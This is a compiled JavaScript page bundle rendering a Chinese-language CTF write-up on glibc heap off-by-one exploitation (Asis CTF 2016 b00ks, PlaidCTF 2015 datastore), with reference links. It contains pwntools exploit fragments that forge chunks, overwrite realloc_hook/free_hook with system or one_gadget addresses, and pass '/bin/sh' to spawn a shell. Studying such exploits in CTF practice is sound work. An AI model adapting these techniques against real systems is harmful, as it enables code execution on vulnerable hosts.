`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"88"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"heap_base"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"b0"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#F78C6C"}},"2")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"heap_base"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"250"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#F78C6C"}},"5"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"71"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"realloc"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"b"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"a8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," payload"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#会先从58130开始分配。在前面我们尽量保持所有内容不变。")])])])],-1),eo=s("p",null,"此时，0x581d0的fd指针指向了realloc_hook，",-1),to=s("p",null,[s("img",{src:Z,alt:"33"})],-1),co=s("p",null,[s("img",{src:Y,alt:"34"})],-1),po=s("p",null,"下面操作的目的是：使得realloc_hook指向one_gadget，这是通过一系列的PUT操作来实现的。",-1),ro=s("p",null,"PUT C块，原本的内存如下：",-1),yo=s("p",null,[s("img",{src:H,alt:"35"})],-1),Fo=s("p",null,[s("img",{src:K,alt:"36"})],-1),Co=s("p",null,"PUT D块前，原本的内存结构如下",-1),Do=s("p",null,[s("img",{src:Q,alt:"37"})],-1),Ao=s("p",null,"构造之后",-1),io=s("p",null,[s("img",{src:W,alt:"38"})],-1),_o=s("p",null,"(后来检查的时候发现这里构造错了，58230之后还要有两个0)",-1),fo=s("p",null,"堆块D的struct如下",-1),ho=s("p",null,[s("img",{src:ss,alt:"39"})],-1),uo=s("p",null,"不知道为什么 原本有的payload没有在内存中显示出来。",-1),Eo=s("p",null,"...两个月后再次看这道题，因为自己期间换过一次内核，所以地址略微有些许滴不一样。",-1),bo=s("p",null,"理解一下后面的思路吧～",-1),xo=s("p",null,"再构建一个e堆块，这里应该是触发漏洞",-1),mo=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"b")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p64"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"system_addr"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"4d")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"e"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"60"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," payload"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"/bin/sh"),s("span",{style:{color:"#89DDFF"}},'"')]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"12")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"GET"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"payload"),s("span",{style:{color:"#89DDFF"}},")")])])])],-1),go=s("p",null,"其实到现在这里还是不太理解，但是这个题略微复杂了一些，不适合我这种(学了两年半的)新手，就先亦已焉哉。",-1);function ko(e,zo,vo,wo,p,Bo){const n=i,r=y;return A(),D(r,{frontmatter:p.frontmatter,data:p.data},{"main-content-md":o(()=>[os,s("h2",ns,[l("一、Asis CTF 2016 b00ks wp (null off-by-one)【详】 "),a(n,{class:"header-anchor",href:"#一、asis-ctf-2016-b00ks-wp-null-off-by-one-【详】","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),s("p",null,[l("文章地址 "),a(n,{href:"https://www.jianshu.com/p/56acd25fd02a",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("https://www.jianshu.com/p/56acd25fd02a")]),_:1})]),as,es,ts,cs,ps,rs,ys,Fs,Cs,Ds,As,is,_s,ds,fs,hs,us,Es,bs,xs,ms,gs,ks,zs,vs,ws,Bs,Ts,Ps,Us,Is,Ns,Ss,$s,s("p",null,[l("free了3个指针，2号堆块的name处存放的是 /bin/sh，des处存放的是free_hook。"),a(n,{href:"https://blog.csdn.net/qq_38204481/article/details/81320898",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("此篇文章")]),_:1}),l(" 中说了 __free_hook函数在内存中前面紧挨的是它的参数，所以要把2号块的name处放/bin/sh。free_hook前面就是/bin/sh。")]),Ls,Rs,s("p",null,[l("参考的文章"),a(n,{href:"https://www.jianshu.com/p/56acd25fd02a",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("https://www.jianshu.com/p/56acd25fd02a")]),_:1}),l(" 中，")]),Vs,js,qs,s("p",null,[a(n,{href:"https://blog.csdn.net/qq_41918771/article/details/101347234",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("初探off-by-one之Asis CTF 2016 b00ks")]),_:1})]),s("p",null,[a(n,{href:"https://blog.csdn.net/qq_33528164/article/details/79778690?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-5.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-5.control",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("Asis CTF 2016 b00ks")]),_:1})]),s("p",null,[a(n,{href:"http://blog.eonew.cn/archives/521",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("__free_hook 劫持原理")]),_:1})]),s("p",null,[a(n,{href:"https://www.dazhuanlan.com/2019/08/22/5d5def6881498/",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("off by one 利用原理")]),_:1})]),s("h2",Os,[l("二、ctf-wiki "),a(n,{class:"header-anchor",href:"#二、ctf-wiki","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),s("p",null,[l("文章地址 "),a(n,{href:"https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/")]),_:1})]),Gs,Ms,Js,s("p",null,[l("题目下载地址 "),a(n,{href:"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/2015_plaidctf_datastore%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8B%96%E5%88%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%87%8C%E5%8D%B3%E5%8F%AF%E3%80%82",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/2015_plaidctf_datastore，直接拖到虚拟机里即可。")]),_:1})]),Xs,Zs,Ys,Hs,Ks,Qs,Ws,sl,s("p",null,[l("参考"),a(n,{href:"https://bbs.pediy.com/thread-246966.htm%EF%BC%8C%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E5%A6%82%E4%B8%8B",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("https://bbs.pediy.com/thread-246966.htm，利用过程如下")]),_:1})]),ll,ol,nl,al,el,tl,cl,pl,rl,yl,Fl,Cl,Dl,Al,il,_l,dl,fl,hl,ul,El,bl,xl,ml,gl,kl,zl,vl,wl,Bl,Tl,Pl,Ul,Il,Nl,Sl,$l,Ll,Rl,s("p",null,[l("这是因为我还是没深入理解！参考 "),a(n,{href:"https://xz.aliyun.com/t/6169",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("https://xz.aliyun.com/t/6169")]),_:1})]),Vl,jl,ql,Ol,Gl,Ml,Jl,Xl,Zl,Yl,Hl,Kl,Ql,Wl,so,lo,oo,no,ao,eo,to,co,po,ro,yo,Fo,Co,Do,Ao,io,_o,fo,ho,uo,Eo,bo,xo,mo,go]),"main-header":o(()=>[t(e.$slots,"main-header")]),"main-header-after":o(()=>[t(e.$slots,"main-header-after")]),"main-nav":o(()=>[t(e.$slots,"main-nav")]),"main-content":o(()=>[t(e.$slots,"main-content")]),"main-content-after":o(()=>[t(e.$slots,"main-content-after")]),"main-nav-before":o(()=>[t(e.$slots,"main-nav-before")]),"main-nav-after":o(()=>[t(e.$slots,"main-nav-after")]),comment:o(()=>[t(e.$slots,"comment")]),footer:o(()=>[t(e.$slots,"footer")]),aside:o(()=>[t(e.$slots,"aside")]),"aside-custom":o(()=>[t(e.$slots,"aside-custom")]),default:o(()=>[t(e.$slots,"default")]),_:3},8,["frontmatter","data"])}const $o=F(ls,[["render",ko]]);export{So as __pageData,$o as default};
